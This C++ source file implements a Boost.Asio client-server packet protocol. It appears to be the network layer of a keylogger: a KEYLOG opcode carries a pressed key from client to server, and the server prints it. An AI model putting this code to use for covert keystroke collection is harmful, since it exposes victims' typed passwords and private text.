#include "NetworkProtocol.hh"

Net::Protocol::Protocol(io_service &ios, Type type) : socket_(ios), type_(type)
{
}

//OPERATIONS HANDLERS
void 								Net::Protocol::handleReceivingHeader(const boost::system::error_code &err,
														size_t bytes)
{
	if (!err)
	{
		size_t 		dataSize(0);

		std::cout << "Header received " << bytes << " bytes" << std::endl;
		std::istringstream 	is(std::string(headerIn_.begin(), headerIn_.end()));
		is >> std::hex >> dataSize;
		dataIn_.resize(dataSize);
		async_read(socket_, buffer(dataIn_),
				bind(&Protocol::handleReceivingData, this,
					boost::asio::placeholders::error,
					boost::asio::placeholders::bytes_transferred));
	}
	else
		std::cout << "Receiving failed" << std::endl;
}

void 								Net::Protocol::handleReceivingData(const boost::system::error_code &err, size_t bytes)
{
	(void) socket;
	if (!err)
	{
		std::cout << "Received data " << bytes << " bytes" << std::endl;
		std::string					archiveData(&dataIn_[0], dataIn_.size());
		std::istringstream 			archiveStream(archiveData);
		archive::text_iarchive 		archive(archiveStream);
		std::cout << std::setw(30) << "PACKET SUMMARY" << std::endl;
		if (type_ == SERVER)
		{
			archive >> clientPacket_;
			std::cout << "OPCODE: " << clientPacket_.opcode << std::endl;
			if (clientPacket_.opcode == (uint16_t) Net::Opcode::Client::KEYLOG)
				std::cout << "KEY PRESSED: "<< clientPacket_.data.payload << ", " << (int) clientPacket_.data.payload[0] << std::endl;
		}
		else
		{
			archive >> serverPacket_;
			std::cout << "OPCODE : " << serverPacket_.opcode << std::endl;
		}
		std::cout << std::endl;
		receive();
	}
	else
		std::cout << "Receiving failed" << std::endl;
}

void 					Net::Protocol::handleSending(const boost::system::error_code &err,
													std::size_t bytes)
{
	if (!err)
	{
		std::cout << "Sended " << bytes << " bytes" << std::endl;
	}
	else
		std::cout << "Sending failed" << std::endl;
}

//OPERATIONS
void 							Net::Protocol::send(Net::Opcode::Client opcode)
{
	std::ostringstream 			headerStream;
	std::string					header;
	ClientServerData			clientPacket;
	std::vector<const_buffer> 	buffers;
	std::ostringstream 			archiveStream;
	archive::text_oarchive 		archive(archiveStream);

	clientPacket.opcode = (uint16_t) opcode;
	archive << clientPacket;
	dataOut_ = archiveStream.str();
	headerStream << std::setw(17) << std::hex << dataOut_.size();
	headerOut_ = headerStream.str();
	buffers.push_back(boost::asio::buffer(headerOut_));
	buffers.push_back(boost::asio::buffer(dataOut_));
	async_write(socket_, buffers,
				boost::bind(&Protocol::handleSending,
				this, boost::asio::placeholders::error,
				boost::asio::placeholders::bytes_transferred));
}

void 							Net::Protocol::send(Net::Opcode::Client opcode, char key)
{
	std::ostringstream 			headerStream;
	std::string					header;
	ClientServerData			clientPacket;
	std::vector<const_buffer> 	buffers;
	std::ostringstream 			archiveStream;
	archive::text_oarchive 		archive(archiveStream);

	clientPacket.opcode = (uint16_t) opcode;
	clientPacket.data.payload[0] = key;
	clientPacket.data.payload[1] = 0;
	archive << clientPacket;
	dataOut_ = archiveStream.str();
	headerStream << std::setw(17) << std::hex << dataOut_.size();
	headerOut_ = headerStream.str();
	buffers.push_back(boost::asio::buffer(headerOut_));
	buffers.push_back(boost::asio::buffer(dataOut_));
	async_write(socket_, buffers,
				boost::bind(&Protocol::handleSending,
				this, boost::asio::placeholders::error,
				boost::asio::placeholders::bytes_transferred));
}

void 							Net::Protocol::send(Net::Opcode::Server opcode)
{
	std::ostringstream 			headerStream;
	std::string					header;
	ServerClientData			serverPacket;
	std::vector<const_buffer> 	buffers;
	std::ostringstream 			archiveStream;
	archive::text_oarchive 		archive(archiveStream);

	serverPacket.opcode = (uint16_t) opcode;
	archive << serverPacket;
	dataOut_ = archiveStream.str();
	headerStream << std::setw(10) << std::hex << dataOut_.size();
	headerOut_ = headerStream.str();
	buffers.push_back(boost::asio::buffer(headerOut_));
	buffers.push_back(boost::asio::buffer(dataOut_));

	async_write(socket_, buffers,
				boost::bind(&Protocol::handleSending,
				this, boost::asio::placeholders::error,
				boost::asio::placeholders::bytes_transferred));
}

void 								Net::Protocol::receive()
{
	(type_ == SERVER ? headerIn_.resize(17) : headerIn_.resize(10));
	async_read(socket_, buffer(headerIn_),
			bind(&Net::Protocol::handleReceivingHeader, this,
				boost::asio::placeholders::error,
				boost::asio::placeholders::bytes_transferred));
}
